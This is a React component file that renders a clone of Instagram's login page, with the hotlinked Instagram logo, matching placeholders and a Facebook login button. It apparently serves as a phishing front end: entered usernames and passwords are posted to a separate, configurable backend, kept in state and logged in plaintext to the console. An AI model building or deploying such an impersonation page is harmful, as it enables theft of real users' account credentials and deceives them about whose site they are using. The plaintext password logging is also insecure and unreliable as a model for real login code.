// src/components/LoginPage.js
import React, { useState } from 'react';
import './LoginPage.css'; // Import the CSS file for styling

function LoginPage() {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [loginDetails, setLoginDetails] = useState(null);
  const [error, setError] = useState(''); // State to handle error messages

  const handleSubmit = async (event) => {
    event.preventDefault();
    setError(''); // Reset error message on new submission

    try {
      // Use environment variable for API URL
      const apiUrl = process.env.REACT_APP_API_URL || 'http://localhost:5000';
      const response = await fetch(`${apiUrl}/login`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ username, password }),
      });

      const data = await response.json(); // Parse response as JSON

      if (response.ok) {
        setLoginDetails({ username, password });
        alert('Login successful');
        console.log('Login Details:', { username, password }); // Log success
      } else {
        setError(data.message || 'Login failed. Please try again.'); // Set error message from server
        alert(`Login failed: ${data.message}`); // Show server error message
      }
    } catch (error) {
      console.error('Error submitting login details:', error);
      setError('An error occurred. Please try again later.'); // Set generic error message
      alert('An error occurred. Please try again later.');
    }
  };

  return (
    <div className="login-container">
      <div className="login-box">
        <img
          src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png"
          alt="Instagram"
          className="logo"
        />
        <form onSubmit={handleSubmit} className="login-form">
          <input
            type="text"
            placeholder="Phone number, username, or email"
            value={username}
            onChange={(e) => setUsername(e.target.value)}
            className="input-field"
            required
          />
          <input
            type="password"
            placeholder="Password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            className="input-field"
            required
          />
          <button type="submit" className="login-button">
            Log In
          </button>
        </form>
        {error && <p className="error-message">{error}</p>} {/* Display error message */}
        <div className="separator">
          <div className="line"></div>
          <span>OR</span>
          <div className="line"></div>
        </div>
        <button className="facebook-button">Log in with Facebook</button>
        <a href="#" className="forgot-password">
          Forgot password?
        </a>
      </div>
      <div className="signup-link">
        <span>Don't have an account? </span>
        <a href="#">Sign up</a>
      </div>
    </div>
  );
}

export default LoginPage;